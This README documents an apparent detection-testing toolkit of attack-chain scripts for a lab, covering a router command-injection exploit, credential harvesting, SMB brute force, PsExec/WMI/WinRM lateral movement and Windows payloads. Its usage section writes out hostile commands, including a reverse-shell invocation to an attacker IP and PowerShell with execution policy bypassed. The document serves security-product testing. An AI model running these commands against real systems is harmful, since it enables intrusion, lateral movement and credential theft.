# Attacker Scripts - Security Testing Toolkit

Educational attack chain scripts for Palo Alto Networks security product testing.

## Contents

### Core Scripts

1. **01_router_exploit.py**
   - Exploits command injection vulnerability in router web interface
   - Establishes reverse shell
   - Performs initial reconnaissance

2. **02_post_exploit_enum.sh**
   - Network enumeration and discovery
   - Port scanning
   - Windows host identification
   - Credential harvesting

3. **03_lateral_movement.py**
   - SMB brute force
   - PsExec lateral movement
   - WMI remote execution
   - WinRM attacks
   - File upload capabilities

4. **04_windows_payload.ps1** (PowerShell version)
   - 11 different execution techniques
   - Generates maximum alerts
   - Executes calc.exe

5. **04_windows_payload.py** (Python version)
   - Cross-platform payload
   - 10 execution techniques
   - Alternative to PowerShell version

## Installation

```bash
# Install Python dependencies
pip3 install -r requirements.txt

# Install optional tools (Kali Linux)
sudo apt-get install -y nmap enum4linux smbclient crackmapexec evil-winrm

# Make scripts executable
chmod +x *.sh *.py
```

## Usage Examples

### Router Exploitation

```bash
# Test vulnerability
python3 01_router_exploit.py 10.0.1.1

# Execute command
python3 01_router_exploit.py 10.0.1.1 --command "whoami"

# Establish reverse shell
python3 01_router_exploit.py 10.0.1.1 --attacker-ip 10.0.1.100 --reverse-shell
```

### Network Enumeration

```bash
# In reverse shell
bash 02_post_exploit_enum.sh

# Results saved to /tmp/.system_cache/
```

### Lateral Movement

```bash
# Full attack chain
python3 03_lateral_movement.py -t 192.168.1.50 \
  -u administrator -p Password123 \
  --full-chain

# Individual techniques
python3 03_lateral_movement.py -t 192.168.1.50 -u admin -p pass --psexec "calc.exe"
python3 03_lateral_movement.py -t 192.168.1.50 -u admin -p pass --wmi "whoami"
```

### Payload Execution

```powershell
# On Windows target (PowerShell)
powershell.exe -ExecutionPolicy Bypass -File 04_windows_payload.ps1

# Or Python version
python 04_windows_payload.py
```

## [!] Warning

**AUTHORIZED USE ONLY**

- These scripts contain real attack techniques
- Only use in controlled lab environments
- Requires explicit authorization
- Educational purposes only

Unauthorized use is illegal.

## Detection Testing

These scripts are designed to generate alerts in:
- Palo Alto Device Security
- Cortex XDR
- XSIAM
- WildFire

Monitor your security products while executing to validate detection coverage.

## MITRE ATT&CK Mapping

- T1190: Exploit Public-Facing Application
- T1059.001: PowerShell
- T1047: Windows Management Instrumentation
- T1021: Remote Services
- T1046: Network Service Scanning
- T1110: Brute Force
- T1547.001: Registry Run Keys
- T1053.005: Scheduled Task

## Support

See `../ATTACK_CHAIN_LAB_GUIDE.md` for full documentation.
